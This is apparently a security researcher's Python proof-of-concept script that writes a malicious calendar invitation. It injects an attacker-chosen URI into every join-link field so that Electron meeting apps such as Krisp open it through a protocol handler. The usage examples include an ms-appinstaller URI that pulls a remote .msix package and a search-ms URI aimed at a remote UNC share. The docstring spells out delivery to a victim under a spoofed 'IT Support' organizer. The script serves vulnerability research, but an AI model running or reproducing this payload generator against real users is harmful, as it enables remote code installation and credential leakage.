#!/usr/bin/env python3
"""Generate a calendar invitation whose conferencing URI is our payload.

Why this exists: Electron meeting apps (Krisp and similar) read
`event.conferencing.uri` from a synced calendar and hand it to a protocol
handler / shell.openExternal sink. The attacker-controlled part of a calendar
invite is the conference/URL field, so that is where the payload goes.

A URI placed in only ONE field may be dropped by whichever calendar the victim
uses, producing a silent no-op that looks like "the app is safe". So the
payload is written into EVERY field a calendar ecosystem uses for the join
link. That maximises the chance the app's `conferencing.uri` gets populated,
which is the unproven hop in most of these findings.

Usage:
    python3 gen_calendar_poc_ics.py                          # default scheme
    python3 gen_calendar_poc_ics.py "poc-zoya:calendarjoin"
    python3 gen_calendar_poc_ics.py "ms-appinstaller:?source=https://x/y.msix" -o evil.ics
    python3 gen_calendar_poc_ics.py "search-ms:query=x&crumb=location:\\\\10.0.0.1\\share"

Then: mail the .ics to the victim calendar address, Accept it, wait for the
client to sync, and click Join. Verify with the benign handler log
(scripts/poc_protocol_handler.ps1) -- do NOT use a live ms-* handler on
someone else's machine.

NOTE: `new URL(x)` in the client throws on a bare UNC path (`\\\\host\\share`),
so the payload must be a syntactically valid URI with a scheme.
"""
import argparse
import datetime as dt
import uuid

FIELDS = [
    "URL:{u}",
    "CONFERENCE;VALUE=URI;FEATURE=VIDEO;LABEL=Join:{u}",
    "X-GOOGLE-CONFERENCE:{u}",
    "X-MICROSOFT-SKYPETEAMSMEETINGURL:{u}",
    "LOCATION:{u}",
]


def build(uri: str, subject: str, org: str, victim: str) -> str:
    now = dt.datetime.now(dt.timezone.utc)
    fmt = lambda d: d.strftime("%Y%m%dT%H%M%SZ")  # noqa: E731
    start, end = now + dt.timedelta(hours=1), now + dt.timedelta(hours=2)
    conf = "\r\n".join(f.format(u=uri) for f in FIELDS)
    return (
        "BEGIN:VCALENDAR\r\n"
        "VERSION:2.0\r\n"
        "PRODID:-//poc//calendar-uri//EN\r\n"
        "CALSCALE:GREGORIAN\r\n"
        "METHOD:REQUEST\r\n"
        "BEGIN:VEVENT\r\n"
        f"UID:{uuid.uuid4()}@poc.local\r\n"
        f"DTSTAMP:{fmt(now)}\r\n"
        f"DTSTART:{fmt(start)}\r\n"
        f"DTEND:{fmt(end)}\r\n"
        f"SUMMARY:{subject}\r\n"
        f"ORGANIZER;CN=IT Support:mailto:{org}\r\n"
        f"ATTENDEE;CN=Victim;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE:mailto:{victim}\r\n"
        f"{conf}\r\n"
        f"DESCRIPTION:Join meeting: {uri}\r\n"
        "SEQUENCE:0\r\n"
        "STATUS:CONFIRMED\r\n"
        "TRANSP:OPAQUE\r\n"
        "BEGIN:VALARM\r\n"
        "ACTION:DISPLAY\r\n"
        "DESCRIPTION:Reminder\r\n"
        "TRIGGER:-PT5M\r\n"
        "END:VALARM\r\n"
        "END:VEVENT\r\n"
        "END:VCALENDAR\r\n"
    )


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("uri", nargs="?", default="poc-zoya:calendarjoin")
    ap.add_argument("-o", "--out", default="calendar_poc.ics")
    ap.add_argument("--subject", default="Standup (POC)")
    ap.add_argument("--organizer", default="it@poc.local")
    ap.add_argument("--victim", default="victim@poc.local")
    a = ap.parse_args()

    with open(a.out, "w", newline="") as fh:
        fh.write(build(a.uri, a.subject, a.organizer, a.victim))

    print(f"[+] wrote {a.out}")
    print(f"[+] conferencing URI injected into {len(FIELDS)} fields: {a.uri}")
    for f in FIELDS:
        print("      " + f.split(":", 1)[0])
    print("[i] mail it to the calendar address, Accept, wait for sync, click Join.")
    print("[i] if the client log stays empty, the server likely normalised the")
    print("    scheme -- that makes provenance the failed link, not the sink.")


if __name__ == "__main__":
    main()
